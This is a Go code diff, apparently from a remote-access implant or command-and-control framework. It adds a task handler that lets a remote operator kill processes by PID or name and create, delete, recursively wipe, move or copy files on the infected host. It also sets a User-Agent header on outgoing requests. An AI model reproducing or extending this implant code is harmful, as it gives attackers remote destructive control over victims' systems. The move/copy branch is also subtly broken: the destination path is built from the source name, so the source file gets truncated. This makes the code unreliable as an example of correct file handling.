@@ -24,10 +24,27 @@ import (
 
 const timeout = time.Second * 15
 
+const (
+	taskIoDelete    uint8 = 0
+	taskIoDeleteAll       = iota
+	taskIoMove
+	taskIoCopy
+	taskIoTouch
+	taskIoKill
+	taskIoKillName
+)
+
 var client struct {
 	sync.Once
 	v *http.Client
 }
+
+var _ Callable = (*DLL)(nil)
+var _ Callable = (*Zombie)(nil)
+var _ Callable = (*Process)(nil)
+var _ Callable = (*Assembly)(nil)
+var _ backer = (*data.Chunk)(nil)
+var _ backer = (*com.Packet)(nil)
 
 type backer interface {
 	Payload() []byte
@@ -101,6 +118,7 @@ func request(u string, r *http.Request) (*http.Response, error) {
 	if r.URL, err = rawParse(u); err != nil {
 		return nil, err
 	}
+	r.Header.Set(userAgent, userValue)
 	return client.v.Do(r)
 }
 func taskPull(x context.Context, r data.Reader, w data.Writer) error {
@@ -261,6 +279,111 @@ func taskProcList(_ context.Context, _ data.Reader, w data.Writer) error {
 		}
 	}
 	return nil
+}
+func taskSystemIo(x context.Context, r data.Reader, w data.Writer) error {
+	t, err := r.Uint8()
+	if err != nil {
+		return err
+	}
+	switch w.WriteUint8(t); t {
+	case taskIoKill:
+		var i uint32
+		if err = r.ReadUint32(&i); err != nil {
+			return err
+		}
+		p, err1 := os.FindProcess(int(i))
+		if err1 != nil {
+			return err1
+		}
+		err = p.Kill()
+		p.Release()
+		return err
+	case taskIoTouch:
+		var n string
+		if err = r.ReadString(&n); err != nil {
+			return err
+		}
+		k := device.Expand(n)
+		if _, err = os.Stat(k); err == nil {
+			return nil
+		}
+		f, err1 := os.Create(k)
+		if err1 != nil {
+			return err1
+		}
+		f.Close()
+		return nil
+	case taskIoDelete:
+		var n string
+		if err = r.ReadString(&n); err != nil {
+			return err
+		}
+		return os.Remove(device.Expand(n))
+	case taskIoKillName:
+		var n string
+		if err = r.ReadString(&n); err != nil {
+			return err
+		}
+		e, err1 := cmd.Processes()
+		if err1 != nil {
+			return err1
+		}
+		var p *os.Process
+		for i := range e {
+			if !strings.EqualFold(n, e[i].Name) {
+				continue
+			}
+			if p, err = os.FindProcess(int(e[i].PID)); err != nil {
+				break
+			}
+			err = p.Kill()
+			if p.Release(); err != nil {
+				break
+			}
+		}
+		e, p = nil, nil
+		return err
+	case taskIoDeleteAll:
+		var n string
+		if err = r.ReadString(&n); err != nil {
+			return err
+		}
+		return os.RemoveAll(device.Expand(n))
+	case taskIoMove, taskIoCopy:
+		var n, d string
+		if err = r.ReadString(&n); err != nil {
+			return err
+		}
+		if err = r.ReadString(&d); err != nil {
+			return err
+		}
+		var (
+			s, f *os.File
+			k    = device.Expand(n)
+			u    = device.Expand(n)
+		)
+		if s, err = os.Open(k); err != nil {
+			return err
+		}
+		if f, err = os.Create(u); err != nil {
+			s.Close()
+			return err
+		}
+		v := data.NewCtxReader(x, s)
+		c, err1 := io.Copy(f, v)
+		v.Close()
+		f.Close()
+		w.WriteString(u)
+		if w.WriteInt64(c); t == taskIoCopy {
+			return err1
+		}
+		if err1 != nil {
+			return err
+		}
+		return os.Remove(k)
+	default:
+		return xerr.Sub("invalid operation", 0xD)
+	}
 }
 func taskScreenShot(_ context.Context, _ data.Reader, w data.Writer) error {
 	return screen.Capture(w)
